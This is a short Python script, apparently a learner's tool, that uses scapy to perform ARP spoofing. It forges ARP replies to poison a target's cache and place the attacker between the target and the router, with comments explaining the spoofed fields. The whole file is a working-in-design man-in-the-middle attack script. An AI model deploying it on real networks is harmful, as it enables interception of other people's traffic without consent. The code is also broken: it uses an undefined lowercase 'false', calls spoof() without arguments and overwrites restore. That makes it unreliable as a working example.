from logging import fatal
import scapy.all as scapy
import time
import sys
 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answer_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst = target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=false)


def restore(destination_ip,source_ip): 
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet= scapy.ARP(op=2 , pdst= destination_ip, hwdst=destination_mac , psrc= source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=false)

restore=()
 
try:
    packets_send_count = 0
    while True:
        spoof()
        spoof()
        packets_send_count = packets_send_count+2
        print("\r[+] send " + str(packets_send_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-]detected clt+c qutting\n")


##!scapy.ls(scapy.ARP) to view all the requredd to set the values
#! here op = 1 measn arp request and op = 2  means arp response
#!pdst = ip of target
#! hwdst = mac of target
#!!psrc = source ip ,but here as we are spoofing we need to give routes ip

